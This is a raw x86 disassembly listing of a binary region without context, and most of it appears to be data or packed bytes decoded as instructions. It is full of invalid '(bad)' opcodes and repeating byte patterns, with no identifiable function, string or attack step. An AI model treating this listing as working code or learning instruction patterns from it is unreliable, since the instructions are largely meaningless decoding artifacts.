  412609:	js     0x41261b
  41260b:	inc    ecx
  41260c:	add    eax,0x5404325
  412611:	bound  eax,QWORD PTR [eax+0x40]
  412614:	inc    ecx
  412615:	inc    ebx
  412616:	push   edi
  412617:	jb     0x412654
  412619:	adc    BYTE PTR ds:0xab4c63b8,al
  41261f:	lahf   
  412620:	inc    ebx
  412621:	lods   eax,DWORD PTR ds:[esi]
  412622:	retf   
  412623:	sub    al,0x18
  412625:	dec    ecx
  412626:	stos   BYTE PTR es:[edi],al
  412627:	jnp    0x412690
  412629:	sbb    bh,BYTE PTR [eax-0x72bfaf9d]
  41262f:	pop    ds
  412630:	inc    ebp
  412631:	int3   
  412632:	adc    eax,0xfe10620a
  412637:	jb     0x41263e
  412639:	(bad)  
  41263a:	retf   
  41263b:	xor    al,0xa8
  41263d:	imul   edi,DWORD PTR [ebp+0x1f],0x41
  412641:	aad    0x7
  412643:	and    eax,0x436241
  412648:	adc    BYTE PTR [eax+0x0],al
  41264b:	add    eax,0x62410040
  412650:	inc    eax
  412651:	add    BYTE PTR [ebx-0x34],al
  412654:	inc    eax
  412655:	add    eax,0x78434040
  41265a:	bound  eax,QWORD PTR [ecx+0x78]
  41265d:	add    eax,0x62404043
  412662:	sbb    BYTE PTR [eax],0xe4
  412665:	mov    ah,0x7b
  412667:	xor    cl,BYTE PTR [esi+0x34]
  41266a:	lds    edx,FWORD PTR [ecx+0x2]
  41266d:	(bad)  
  41266e:	cmp    DWORD PTR [ebx-0x3],eax
  412671:	inc    eax
  412672:	inc    ecx
  412673:	imul   eax,DWORD PTR [ebp+0x441e4b56],0x40
  41267a:	inc    ebp
  41267b:	lods   al,BYTE PTR ds:[esi]
  41267c:	fs rcl cl,0x44
  412680:	sub    al,0x41
  412682:	inc    eax
  412683:	add    eax,0x43436240
  412688:	add    eax,0x62004040
  41268d:	inc    eax
  41268e:	add    BYTE PTR [ecx+0x40],al
  412691:	inc    ebx
  412692:	test   BYTE PTR ds:0x58054041,ah
  412698:	inc    eax
  412699:	inc    eax
  41269a:	bound  eax,QWORD PTR [eax+0x66]
  41269d:	inc    ecx
  41269e:	inc    eax
  41269f:	add    eax,0xde80100
  4126a4:	mov    eax,0x7eff29e5
  4126a9:	and    eax,0x1d0d2a48
  4126ae:	div    DWORD PTR [ecx*8-0x34d9e414]
  4126b5:	pop    edx
  4126b6:	xchg   ebp,eax
  4126b7:	bound  edi,QWORD PTR [eax-0x33]
  4126ba:	loope  0x412719
  4126bc:	nop
  4126bd:	repz mov ah,0x40
  4126c0:	cli    
  4126c1:	jl     0x4126c3
  4126c3:	add    BYTE PTR [ebx+0x40],al
  4126c6:	bound  eax,QWORD PTR ds:0x25404110
  4126cc:	add    ah,cl
  4126ce:	inc    ebx
  4126cf:	add    eax,0x40402562
  4126d4:	add    BYTE PTR [eax+0x40],al
  4126d7:	inc    ecx
  4126d8:	inc    ecx
  4126d9:	add    eax,0x78434025
  4126de:	bound  eax,QWORD PTR [eax-0x7c]
  4126e1:	inc    eax
  4126e2:	inc    ecx
  4126e3:	fs xor eax,0x253f9bbf
  4126e9:	inc    esp
  4126ea:	ret    
  4126eb:	adc    al,BYTE PTR [eax+0x42]
  4126ee:	adc    eax,0xb82c6e38
  4126f3:	call   0x58196b4
  4126f8:	inc    eax
  4126f9:	jl     0x412708
  4126fb:	bound  eax,QWORD PTR [ecx+0x10]
  4126fe:	fst    QWORD PTR [edi+0x6d]
  412701:	(bad)
  412704:	stos   BYTE PTR es:[edi],al
  412705:	bound  ebx,QWORD PTR [ebx-0x47b1bfb5]
  41270b:	fs sub al,al
  41270e:	inc    ecx
  41270f:	inc    eax
  412710:	inc    eax
  412711:	inc    ebx
  412712:	int3   
  412713:	add    BYTE PTR ds:0x56240,al
  412719:	inc    ebx
  41271a:	inc    eax
  41271b:	inc    eax
  41271c:	add    BYTE PTR [ecx+0x62],al
  41271f:	bound  eax,QWORD PTR [eax]
  412721:	int3   
  412722:	inc    eax
  412723:	inc    ebx
  412724:	add    eax,0x43624041
  412729:	adc    BYTE PTR [ecx+0x5],al
  41272c:	inc    eax
  41272d:	fst    QWORD PTR [ecx]
  41272f:	and    bh,dh
  412731:	inc    ebp
  412732:	bound  eax,QWORD PTR [eax]
  412734:	retf   
  412735:	int3   
  412736:	add    cl,BYTE PTR [edx+0x44]
  412739:	inc    eax
  41273a:	jae    0x41277c
  41273c:	mov    edi,0x2c40130e
  412741:	aam    0xe0
  412743:	inc    eax
  412744:	mov    edi,0x621141e7
  412749:	inc    ebx
  41274a:	inc    eax
  41274b:	adc    BYTE PTR ds:0x4158cc40,al
  412751:	inc    ebx
  412752:	bound  eax,QWORD PTR [ecx+0x40]
  412755:	add    eax,0x4140
  41275a:	and    eax,0x40400062
  41275f:	add    eax,0x84404340
  412764:	int3   
  412765:	js     0x412767
  412767:	inc    ecx
  412768:	adc    BYTE PTR [edx+0xf],ah
  41276b:	jp     0x4126fd
  41276d:	inc    edx
  41276e:	bts    DWORD PTR [esi],ebp
  412771:	jno    0x41278a
  412773:	aad    0x63
  412775:	xor    eax,0x1230f997
  41277a:	dec    esi
  41277b:	fdivr  QWORD PTR [eax+0x43436243]
  412781:	adc    DWORD PTR [esi+edx*8+0x5],eax
  412785:	into   
  412786:	push   ecx
  412787:	add    BYTE PTR [ebx-0x349bdbb4],bh
  41278d:	mov    esp,0x11e7ecc4
  412792:	inc    sp
  412794:	dec    ecx
  412795:	or     eax,0x49456406
  41279a:	add    BYTE PTR [eax+0x41],al
  41279d:	inc    eax
  41279e:	inc    ebx
  41279f:	bound  ax,DWORD PTR ds:0x40434100
  4127a6:	add    eax,0x40054062
  4127ab:	bound  eax,QWORD PTR [ecx+0x40]
  4127ae:	inc    ebx
  4127af:	inc    eax
  4127b0:	add    eax,0x25405841
  4127b5:	bound  eax,QWORD PTR [eax+0x43]
  4127b8:	inc    eax
  4127b9:	adc    BYTE PTR [edx+0x2c],al
  4127bc:	stos   DWORD PTR es:[edi],eax
  4127bd:	retf   
  4127be:	fadd   DWORD PTR [ecx]
  4127c0:	push   edx
  4127c1:	xor    ebp,DWORD PTR [ecx]
  4127c3:	js     0x412807
  4127c5:	fwait
  4127c6:	bound  edx,QWORD PTR [eax]
  4127c8:	retf   0xe63f
  4127cb:	int    0x1d
  4127cd:	stos   DWORD PTR es:[edi],eax
  4127ce:	rol    BYTE PTR [eax+0x56],1
  4127d1:	fs inc eax
  4127d3:	and    BYTE PTR [edx+eax*2-0x2ed1d7bb],cl
  4127da:	pusha  
  4127db:	(bad)  
  4127dc:	lods   al,BYTE PTR ds:[esi]
  4127dd:	xor    al,0x3d
  4127df:	adc    esp,DWORD PTR [eax]
  4127e1:	inc    esp
  4127e2:	inc    edx
  4127e3:	inc    eax
  4127e4:	inc    ecx
  4127e5:	inc    ebx
  4127e6:	inc    eax
  4127e7:	add    eax,0x43406262
  4127ec:	inc    ecx
  4127ed:	adc    BYTE PTR [eax],al
  4127ef:	inc    eax
  4127f0:	add    eax,0x43000562
  4127f5:	add    BYTE PTR [ecx+0x40],al
  4127f8:	inc    eax
  4127f9:	add    eax,0x400062
  4127fe:	inc    ebx
  4127ff:	inc    eax
  412800:	js     0x412843
  412802:	inc    ecx
  412803:	bound  eax,QWORD PTR [eax+0x44]
  412806:	adc    eax,0x80345e88
  41280b:	xchg   ecx,eax
  41280c:	inc    eax
  41280d:	sub    al,0xc9
  41280f:	jnp    0x4127b9
  412811:	adc    BYTE PTR [ebx+0x51761587],0x42
  412818:	(bad)  
  412819:	lds    eax,FWORD PTR [ecx-0x6b]
  41281c:	lds    eax,FWORD PTR cs:[ecx-0x2]
  412820:	cli    
  412821:	dec    eax
  412822:	adc    edi,DWORD PTR [eax+0x4e]
  412825:	inc    edx
  412826:	(bad)  
  412827:	dec    edi
  412828:	bound  eax,QWORD PTR [esi+0x62]
  41282b:	inc    eax
  41282c:	add    eax,0x40430041
  412831:	inc    eax
  412832:	inc    ecx
  412833:	inc    eax
  412834:	inc    eax
  412835:	bound  eax,QWORD PTR ds:0x5624300
  41283b:	add    BYTE PTR [eax+0x40],al
  41283e:	add    BYTE PTR [ecx+0x43],al
  412841:	add    BYTE PTR [eax+0x41],al
  412844:	add    eax,0x40436200
  412849:	inc    eax
  41284a:	add    eax,0x40532462
  41284f:	dec    BYTE PTR [eax-0x8bd40b8]
  412855:	or     DWORD PTR [edi],esi
  412857:	inc    esp
  412858:	bound  edx,QWORD PTR ds:0x112c302a
  41285e:	inc    eax
  41285f:	sub    al,0x2e
  412861:	retf   
  412862:	adc    BYTE PTR [edx+0x66],bh
  412865:	pop    edi
  412866:	push   0xac4c3574
  41286b:	push   ds
  41286c:	ds mov ecx,0xc5501040
  412872:	inc    ecx
  412873:	test   al,0xca
  412875:	inc    eax
  412876:	pusha  
  412877:	lea    eax,[edx]
  412879:	xor    al,0xad
  41287b:	adc    al,BYTE PTR [ebx+0x33]
  41287e:	push   esi
  41287f:	inc    esp
  412880:	inc    ecx
  412881:	inc    eax
  412882:	add    eax,0x41624340
  412887:	test   BYTE PTR [eax],al
  412889:	and    eax,0x404043
  41288e:	add    BYTE PTR ds:0x626210,al
  412894:	add    eax,0x43404140
  412899:	inc    eax
  41289a:	inc    ecx
  41289b:	add    eax,0x10664062
  4128a0:	inc    ebx
  4128a1:	bound  edi,QWORD PTR [ebx-0x4c]
  4128a4:	xor    BYTE PTR [edi+0x55],cl
  4128a7:	dec    ecx
  4128a8:	inc    eax
  4128a9:	sub    al,0xb0
  4128ab:	pushf  
  4128ac:	push   eax
  4128ad:	bound  ebx,QWORD PTR [edx+0x43720115]
  4128b3:	bound  edi,QWORD PTR [eax]
  4128b5:	jb     0x412865
  4128b7:	mov    edi,0x9298cd24
  4128bc:	and    BYTE PTR es:[eax+0x39],cl
  4128c0:	inc    eax
  4128c1:	and    ah,dl
  4128c3:	lds    esi,FWORD PTR [eax+0x2ff9c562]
  4128c9:	inc    BYTE PTR ds:0x4041cc
  4128cf:	add    BYTE PTR [eax],al
  4128d1:	inc    eax
  4128d2:	inc    eax
  4128d3:	inc    ebx
  4128d4:	bound  eax,QWORD PTR [eax]
  4128d6:	inc    eax
  4128d7:	inc    eax
  4128d8:	add    eax,0x62434162
  4128dd:	inc    eax
  4128de:	js     0x4128f0
  4128e0:	inc    ecx
  4128e1:	add    eax,0x5404325
  4128e6:	bound  eax,QWORD PTR [eax+0x40]
  4128e9:	inc    ecx
  4128ea:	inc    ebx
  4128eb:	cmp    DWORD PTR [ecx+0x62],edx
  4128ee:	sub    BYTE PTR [edi+0x21],cl
  4128f1:	es inc esp
  4128f3:	data16 inc BYTE PTR [edx+0x34]
  4128f7:	cmp    dl,0x40
  4128fa:	sub    al,0x31
  4128fc:	dec    edi
  4128fd:	sub    dh,BYTE PTR [esi+ebp*1]
  412900:	cmp    BYTE PTR ds:0x436241,ah
  412906:	adc    BYTE PTR [eax+0x0],al
  412909:	add    eax,0x62410040
  41290e:	inc    eax
  41290f:	add    BYTE PTR [ebx-0x34],al
  412912:	inc    eax
  412913:	add    eax,0x78434040
  412918:	bound  eax,QWORD PTR [ecx+0x78]
  41291b:	add    eax,0x62404043
  412920:	pusha  
  412921:	jo     0x412942
  412923:	inc    edx
  412924:	inc    eax
  412925:	sub    BYTE PTR [ecx-0x3333fb2e],0xcc
  41292c:	int3   
  41292d:	int3   
  41292e:	int3   
  41292f:	int3   
  412930:	dec    edx
  412931:	and    eax,edx
  412933:	nop
  412934:	not    edx
  412936:	inc    edx
  412937:	add    eax,edx
  412939:	ret    
  41293a:	int3   
  41293b:	int3   
  41293c:	int3   
  41293d:	int3   
  41293e:	int3   
  41293f:	int3   
  412940:	dec    eax
  412941:	sub    BYTE PTR [edi],dl
  412943:	sub    al,ch
  412945:	and    esi,DWORD PTR [ebx-0x6f1362bf]
  41294b:	inc    esp
  41294c:	push   eax
  41294d:	rcl    BYTE PTR [ebx+0x1c],cl
  412950:	inc    esp
  412951:	popa   
  412952:	push   0xb300432a
  412957:	inc    eax
  412958:	sub    al,0x29
  41295a:	adc    eax,DWORD PTR [ecx+0x40]
  41295d:	add    eax,0x43436240
  412962:	add    eax,0x62004040
  412967:	inc    eax
  412968:	add    BYTE PTR [ecx+0x40],al
  41296b:	inc    ebx
  41296c:	test   BYTE PTR ds:0x58054041,ah
  412972:	inc    eax
  412973:	inc    eax
  412974:	bound  eax,QWORD PTR [eax+0x66]
  412977:	inc    ecx
  412978:	inc    eax
  412979:	add    eax,0x445a000
  41297e:	inc    ecx
  41297f:	and    ebp,DWORD PTR [esi+0x67]
  412982:	cmp    al,0xd
  412984:	sub    al,0xd2
  412986:	mov    ah,0x56
  412988:	aad    0x8c
  41298a:	(bad)  
  41298b:	leave  
  41298c:	call   0x20815a6b
  412991:	test   al,0xbc
  412993:	loopne 0x412928
  412995:	and    dl,ch
  412997:	sub    esi,edi
  412999:	adc    BYTE PTR ds:0x380d,dl
  41299f:	inc    ebx
  4129a0:	inc    eax
  4129a1:	bound  eax,QWORD PTR ds:0x25404110
  4129a7:	add    ah,cl
  4129a9:	inc    ebx
  4129aa:	add    eax,0x40402562
  4129af:	add    BYTE PTR [eax+0x40],al
  4129b2:	inc    ecx
  4129b3:	inc    ecx
  4129b4:	add    eax,0x78434025
  4129b9:	bound  eax,QWORD PTR [eax-0x7c]
  4129bc:	inc    eax
  4129bd:	inc    ecx
  4129be:	dec    esi
  4129bf:	xor    eax,DWORD PTR [eax+0x44]
  4129c2:	dec    eax
  4129c3:	push   edi
  4129c4:	retf   
  4129c5:	retf   0x9da6
  4129c8:	sub    al,0x2c
  4129ca:	inc    edx
  4129cb:	push   ss
  4129cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129cd:	arpl   di,bx
  4129cf:	push   edi
  4129d0:	inc    eax
  4129d1:	ins    BYTE PTR es:[edi],dx
  4129d2:	aas    
  4129d3:	push   edx
  4129d4:	add    eax,0x2ed31445
  4129d9:	int    0xa0
  4129db:	jnp    0x4129a6
  4129dd:	sub    al,BYTE PTR [eax+0x64204067]
  4129e3:	shl    esp,0x17
  4129e6:	push   ds
  4129e7:	shl    DWORD PTR [esi+0x41e1e6fe],cl
  4129ed:	inc    eax
  4129ee:	inc    eax
  4129ef:	inc    ebx
  4129f0:	int3   
  4129f1:	add    BYTE PTR ds:0x56240,al
  4129f7:	inc    ebx
  4129f8:	inc    eax
  4129f9:	inc    eax
  4129fa:	add    BYTE PTR [ecx+0x62],al
  4129fd:	bound  eax,QWORD PTR [eax]
  4129ff:	int3   
  412a00:	inc    eax
  412a01:	inc    ebx
  412a02:	add    eax,0x43624041
  412a07:	adc    BYTE PTR [ecx+0x5],al
  412a0a:	inc    eax
  412a0b:	dec    ebp
  412a0c:	dec    edx
  412a0d:	stos   BYTE PTR es:[edi],al
  412a0e:	cmp    al,0x40
  412a10:	inc    esp
  412a11:	cmp    BYTE PTR [eax+0x15],cl
  412a14:	bound  esp,QWORD PTR [esi]
  412a16:	xchg   ebx,eax
  412a17:	inc    eax
  412a18:	sub    al,0x4c
  412a1a:	inc    ebp
  412a1b:	les    ecx,FWORD PTR [esi]
  412a1d:	clc    
  412a1e:	xor    ebp,DWORD PTR ss:[edx-0x14]
  412a22:	pop    ebp
  412a23:	bound  esi,QWORD PTR [eax]
  412a25:	adc    edx,DWORD PTR [ebx+0x522dc55c]
  412a2b:	ins    BYTE PTR es:[edi],dx
  412a2c:	arpl   ax,ax
  412a2e:	sbb    BYTE PTR [eax+0x20],al
  412a31:	bound  eax,QWORD PTR [ebx+0x40]
  412a34:	adc    BYTE PTR ds:0x4158cc40,al
  412a3a:	inc    ebx
  412a3b:	bound  eax,QWORD PTR [ecx+0x40]
  412a3e:	add    eax,0x4140
  412a43:	and    eax,0x40400062
  412a48:	add    eax,0x84404340
  412a4d:	int3   
  412a4e:	js     0x412a50
  412a50:	inc    ecx
  412a51:	adc    BYTE PTR [edx+0xf],ah
  412a54:	pusha  
  412a55:	leave  
  412a56:	adc    BYTE PTR [ecx+eiz*4+0x77],dh
  412a5a:	and    eax,0x456c3cfe
  412a5f:	fs ins DWORD PTR es:[edi],dx
  412a61:	push   ecx
  412a62:	inc    eax
  412a63:	inc    esp
  412a64:	in     al,dx
  412a65:	popf   
  412a66:	bound  edx,QWORD PTR ds:0xc42c301b
  412a6d:	bound  ecx,QWORD PTR [esi]
  412a6f:	add    eax,0x6840c462
  412a74:	gs push ss
  412a76:	test   al,0x87
  412a78:	cmp    al,0x14
  412a7a:	pusha  
  412a7b:	aad    0xd4
  412a7d:	sub    BYTE PTR [ecx],dl
  412a7f:	sbb    ebp,DWORD PTR [eax+0x25]
  412a82:	pusha  
  412a83:	adc    DWORD PTR [eax],eax
  412a85:	inc    eax
  412a86:	inc    ecx
  412a87:	inc    eax
  412a88:	inc    ebx
  412a89:	bound  ax,DWORD PTR ds:0x40434100
  412a90:	add    eax,0x40054062
  412a95:	bound  eax,QWORD PTR [ecx+0x40]
  412a98:	inc    ebx
  412a99:	inc    eax
  412a9a:	add    eax,0x25405841
  412a9f:	bound  eax,QWORD PTR [eax+0x43]
  412aa2:	inc    eax
  412aa3:	adc    dl,dh
  412aa5:	dec    eax
  412aa6:	mov    al,ds:0x40be054e
  412aab:	inc    ah
  412aad:	or     eax,0x50af650d
  412ab2:	xor    al,BYTE PTR [edi+ecx*2-0x37]
  412ab6:	inc    edx
  412ab7:	inc    eax
  412ab8:	inc    ecx
  412ab9:	inc    ebx
  412aba:	inc    eax
  412abb:	add    eax,0x43406262
  412ac0:	inc    ecx
  412ac1:	adc    BYTE PTR [eax],al
  412ac3:	inc    eax
  412ac4:	add    eax,0x43000562
  412ac9:	add    BYTE PTR [ecx+0x40],al
  412acc:	inc    eax
  412acd:	add    eax,0x400062
  412ad2:	inc    ebx
  412ad3:	inc    eax
  412ad4:	js     0x412b17
  412ad6:	inc    ecx
  412ad7:	bound  eax,QWORD PTR [eax+0x7c]
  412ada:	push   eax
  412adb:	xor    eax,DWORD PTR [eax+0x2c]
  412ade:	jne    0x412b28
  412ae0:	add    BYTE PTR [eax+0x6e],bl
  412ae3:	inc    edx
  412ae4:	sub    BYTE PTR [esi-0x3d],ah
  412ae7:	retf   
  412ae8:	call   0xd896bb4f
  412aed:	push   esi
  412aee:	bound  eax,QWORD PTR gs:[eax+0x5]
  412af2:	inc    ecx
  412af3:	add    BYTE PTR [ebx+0x40],al
  412af6:	inc    eax
  412af7:	inc    ecx
  412af8:	inc    eax
  412af9:	inc    eax
  412afa:	bound  eax,QWORD PTR ds:0x5624300
  412b00:	add    BYTE PTR [eax+0x40],al
  412b03:	add    BYTE PTR [ecx+0x43],al
  412b06:	add    BYTE PTR [eax+0x41],al
  412b09:	add    eax,0x40436200
  412b0e:	inc    eax
  412b0f:	add    eax,0xc4635062
  412b14:	inc    edx
  412b15:	or     eax,0x434f8940
  412b1a:	mov    edx,0x4a57254f
  412b1f:	inc    esp
  412b20:	fdiv   QWORD PTR [ebp+0x187c8088]
  412b26:	inc    eax
  412b27:	sub    al,0x32
  412b29:	cmp    al,0x6c
  412b2b:	(bad)
  412b2e:	dec    ebp
  412b2f:	fs inc ecx
  412b31:	inc    eax
  412b32:	add    eax,0x41624340
  412b37:	test   BYTE PTR [eax],al
  412b39:	and    eax,0x404043
  412b3e:	add    BYTE PTR ds:0x626210,al
  412b44:	add    eax,0x43404140
  412b49:	inc    eax
  412b4a:	inc    ecx
  412b4b:	add    eax,0x10664062
  412b50:	inc    ebx
  412b51:	bound  edi,QWORD PTR [ebp+0x39]
  412b54:	inc    eax
  412b55:	inc    ecx
  412b56:	scas   al,BYTE PTR es:[edi]
  412b57:	push   eax
  412b58:	dec    eax
  412b59:	lds    ebp,FWORD PTR [eax+0x4a376520]
  412b5f:	xor    DWORD PTR [eax+0x17],eax
  412b62:	adc    DWORD PTR [ecx-0x46],esi
  412b65:	cwde   
  412b66:	or     dh,BYTE PTR [edi+0x65]
  412b69:	dec    BYTE PTR [eax+ecx*4+0x30]
  412b6d:	bound  edx,QWORD PTR [edx+0x73]
  412b70:	cmp    BYTE PTR [eax+ecx*1+0x63],al
  412b74:	dec    esp
  412b75:	inc    eax
  412b76:	cwde   
  412b77:	inc    ebp
  412b78:	inc    eax
  412b79:	sub    al,0xcb
  412b7b:	cld    
  412b7c:	add    eax,0x4041cc
  412b81:	add    BYTE PTR [eax],al
  412b83:	inc    eax
  412b84:	inc    eax
  412b85:	inc    ebx
  412b86:	bound  eax,QWORD PTR [eax]
  412b88:	inc    eax
  412b89:	inc    eax
  412b8a:	add    eax,0x62434162
  412b8f:	inc    eax
  412b90:	js     0x412ba2
  412b92:	inc    ecx
  412b93:	add    eax,0x5404325
  412b98:	bound  eax,QWORD PTR [eax+0x40]
  412b9b:	inc    ecx
  412b9c:	inc    ebx
  412b9d:	call   0x10326f00
  412ba2:	bound  ecx,QWORD PTR [esi+eiz*2+0xd]
  412ba6:	jg     0x412bad
  412ba8:	push   edi
  412ba9:	inc    eax
  412baa:	aad    0x5
  412bac:	arpl   WORD PTR [eax+ebp*4+0x6c147765],bx
  412bb3:	inc    esi
  412bb4:	fsub   QWORD PTR [ebx+0x10]
  412bb7:	sar    BYTE PTR [edi+0x42cafa40],1
  412bbd:	sbb    al,0xb8
  412bbf:	out    0x8a,eax
  412bc1:	pop    ds
  412bc2:	fs in  al,0x10
  412bc5:	ins    BYTE PTR es:[edi],dx
  412bc6:	add    eax,0x412539aa
  412bcb:	bound  eax,QWORD PTR [ebx+0x0]
  412bce:	adc    BYTE PTR [eax+0x0],al
  412bd1:	add    eax,0x62410040
  412bd6:	inc    eax
  412bd7:	add    BYTE PTR [ebx-0x34],al
  412bda:	inc    eax
  412bdb:	add    eax,0x78434040
  412be0:	bound  eax,QWORD PTR [ecx+0x78]
  412be3:	add    eax,0x62404043
  412be8:	pusha  
  412be9:	inc    esp
  412bea:	bound  ebp,QWORD PTR [edx+0x62]
  412bed:	int    0xb
  412bef:	retf   
  412bf0:	shr    BYTE PTR [ecx+edx*4],1
  412bf3:	dec    eax
  412bf4:	rol    BYTE PTR [eax-0x31],0x3f
  412bf8:	inc    eax
  412bf9:	pusha  
  412bfa:	test   eax,0x17464580
  412bff:	push   ebp
  412c00:	add    eax,DWORD PTR [edx]
  412c02:	mov    ah,0x52
  412c04:	and    eax,0x5404172
  412c09:	inc    eax
  412c0a:	bound  eax,QWORD PTR [ebx+0x43]
  412c0d:	add    eax,0x62004040
  412c12:	inc    eax
  412c13:	add    BYTE PTR [ecx+0x40],al
  412c16:	inc    ebx
  412c17:	test   BYTE PTR ds:0x58054041,ah
  412c1d:	inc    eax
  412c1e:	inc    eax
  412c1f:	bound  eax,QWORD PTR [eax+0x66]
  412c22:	inc    ecx
  412c23:	inc    eax
  412c24:	add    eax,0x40562e00
  412c29:	popf   
  412c2a:	pop    ebp
  412c2b:	mov    esp,0x13c9f43e
  412c30:	or     DWORD PTR [edi+edi*1+0x20],eax
  412c34:	leave  
  412c35:	(bad)  
  412c36:	jmp    0x6e6d6c96
  412c3b:	xchg   ebp,eax
  412c3c:	stc    
  412c3d:	inc    esi
  412c3e:	dec    ecx
  412c3f:	pop    ds
  412c40:	push   ss
  412c41:	pop    esi
  412c42:	mov    edi,0x43000045
  412c47:	inc    eax
  412c48:	bound  eax,QWORD PTR ds:0x25404110
  412c4e:	add    ah,cl
  412c50:	inc    ebx
  412c51:	add    eax,0x40402562
  412c56:	add    BYTE PTR [eax+0x40],al
  412c59:	inc    ecx
  412c5a:	inc    ecx
  412c5b:	add    eax,0x78434025
  412c60:	bound  eax,QWORD PTR [eax-0x7c]
  412c63:	inc    eax
  412c64:	inc    ecx
  412c65:	mov    BYTE PTR [ecx+edx*1],ah
  412c68:	inc    ax
  412c6a:	or     edx,DWORD PTR [ebp+0x50]
  412c6d:	or     eax,0x1277d140
  412c72:	mov    ebp,0x86cd07bd
  412c77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c78:	test   eax,eax
  412c7a:	mov    edi,0xa910c869
  412c7f:	push   es
  412c80:	jae    0x412cc2
  412c82:	mov    edi,0xb4d80a7d
  412c87:	es dec esp
  412c89:	add    eax,0x544dcbd
  412c8e:	inc    ecx
  412c8f:	xchg   esp,eax
  412c90:	xchg   edx,eax
  412c91:	inc    eax
  412c92:	pop    esp
  412c93:	inc    ecx
  412c94:	inc    eax
  412c95:	inc    eax
  412c96:	inc    ebx
  412c97:	int3   
  412c98:	add    BYTE PTR ds:0x56240,al
  412c9e:	inc    ebx
  412c9f:	inc    eax
  412ca0:	inc    eax
  412ca1:	add    BYTE PTR [ecx+0x62],al
  412ca4:	bound  eax,QWORD PTR [eax]
  412ca6:	int3   
  412ca7:	inc    eax
  412ca8:	inc    ebx
  412ca9:	add    eax,0x43624041
  412cae:	adc    BYTE PTR [ecx+0x5],al
  412cb1:	inc    eax
  412cb2:	push   esi
  412cb3:	mov    ds:0xaf2c3743,eax
  412cb8:	adc    eax,DWORD PTR [ecx+0x58]
  412cbb:	and    ch,BYTE PTR [ecx]
  412cbd:	cld    
  412cbe:	(bad)  [eax]
  412cc0:	inc    eax
  412cc1:	or     esp,DWORD PTR [edi+0x53]
  412cc4:	mov    eax,0x655f3667
  412cc9:	mov    esp,0x1a63cd41
  412cce:	bound  esi,QWORD PTR [edi-0x371340c0]
  412cd4:	xor    esi,DWORD PTR [ecx+ecx*8+0x10]
  412cd8:	pusha  
  412cd9:	mov    edi,0x63a4535c
  412cde:	push   ecx
  412cdf:	xor    eax,0x10404362
  412ce4:	add    eax,0x4158cc40
  412ce9:	inc    ebx
  412cea:	bound  eax,QWORD PTR [ecx+0x40]
  412ced:	add    eax,0x4140
  412cf2:	and    eax,0x40400062
  412cf7:	add    eax,0x84404340
  412cfc:	int3   
  412cfd:	js     0x412cff
  412cff:	inc    ecx
  412d00:	adc    BYTE PTR [edx+0xf],ah
  412d03:	inc    eax
  412d04:	mov    ebp,0xe62521c
  412d09:	mov    cl,0x13
  412d0b:	cmc    
  412d0c:	pop    edx
  412d0d:	sub    eax,0x4cfc4084
  412d12:	std    
  412d13:	xor    DWORD PTR [ecx+0x46],eax
  412d16:	sub    DWORD PTR [eax+0x461fbe6b],esp
  412d1c:	addr16 nop
  412d1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d1f:	imul   esi,DWORD PTR [ecx],0xbcf0b3ab
  412d25:	push   0xbe9c1b52
  412d2a:	jmp    FWORD PTR [ecx-0x41]
  412d2d:	test   al,0xc6
  412d2f:	je     0x412d31
  412d31:	inc    eax
  412d32:	inc    ecx
  412d33:	inc    eax
  412d34:	inc    ebx
  412d35:	bound  ax,DWORD PTR ds:0x40434100
  412d3c:	add    eax,0x40054062
  412d41:	bound  eax,QWORD PTR [ecx+0x40]
  412d44:	inc    ebx
  412d45:	inc    eax
  412d46:	add    eax,0x25405841
  412d4b:	bound  eax,QWORD PTR [eax+0x43]
  412d4e:	inc    eax
  412d4f:	adc    BYTE PTR [ecx+esi*2-0x6d],ah
  412d53:	push   ebx
  412d54:	mov    edi,0x39627411
  412d59:	fld    QWORD PTR [edx-0x53b7426d]
  412d5f:	inc    edi
  412d60:	add    al,0x3c
  412d62:	jae    0x412da9
  412d64:	pop    eax
  412d65:	or     BYTE PTR [eax+eax*8+0x62],dl
  412d69:	sub    BYTE PTR [esi+0x22],ah
  412d6c:	inc    ecx
  412d6d:	retf   
  412d6e:	xchg   ecx,eax
  412d6f:	call   0xd5f8ffb4
  412d74:	mov    DWORD PTR [ebx-0x44],0x3f5feba8
  412d7b:	mov    ds:0x62150fa8,al
  412d80:	and    edx,ecx
  412d82:	lock push ax
  412d85:	cmp    al,0xcb
  412d87:	outs   dx,BYTE PTR ds:[esi]
  412d88:	inc    eax
  412d89:	inc    ecx
  412d8a:	inc    ebx
  412d8b:	inc    eax
  412d8c:	add    eax,0x43406262
  412d91:	inc    ecx
  412d92:	adc    BYTE PTR [eax],al
  412d94:	inc    eax
  412d95:	add    eax,0x43000562
  412d9a:	add    BYTE PTR [ecx+0x40],al
  412d9d:	inc    eax
  412d9e:	add    eax,0x400062
  412da3:	inc    ebx
  412da4:	inc    eax
  412da5:	js     0x412de8
  412da7:	inc    ecx
  412da8:	bound  eax,QWORD PTR [eax+0x5]
  412dab:	sar    BYTE PTR [edi+0x1486360],1
  412db1:	bound  eax,QWORD PTR [edi-0x72ba9915]
  412db7:	enter  0x4042,0x40
  412dbb:	jmp    0xd0a36b7f
  412dc0:	inc    edx
  412dc1:	dec    edi
  412dc2:	inc    eax
  412dc3:	scas   eax,DWORD PTR es:[edi]
  412dc4:	lock inc ebp
  412dc6:	cmp    eax,0x42407c46
  412dcb:	dec    esp
  412dcc:	xchg   ebp,eax
  412dcd:	aas    
  412dce:	pop    ebx
  412dcf:	and    eax,0x540626c
  412dd4:	inc    ecx
  412dd5:	add    BYTE PTR [ebx+0x40],al
  412dd8:	inc    eax
  412dd9:	inc    ecx
  412dda:	inc    eax
  412ddb:	inc    eax
  412ddc:	bound  eax,QWORD PTR ds:0x5624300
  412de2:	add    BYTE PTR [eax+0x40],al
  412de5:	add    BYTE PTR [ecx+0x43],al
  412de8:	add    BYTE PTR [eax+0x41],al
  412deb:	add    eax,0x40436200
  412df0:	inc    eax
  412df1:	add    eax,0x61f05f62
  412df6:	fadd   DWORD PTR [ebp-0x3e]
  412df9:	sbb    al,0x34
  412dfb:	sub    BYTE PTR [ebx-0x2c],al
  412dfe:	sar    DWORD PTR [edi],1
  412e00:	jmp    0x46d8:0x47427ca8
  412e07:	jg     0x412e6b
  412e09:	adc    DWORD PTR [ecx],ebp
  412e0b:	outs   dx,BYTE PTR ds:[esi]
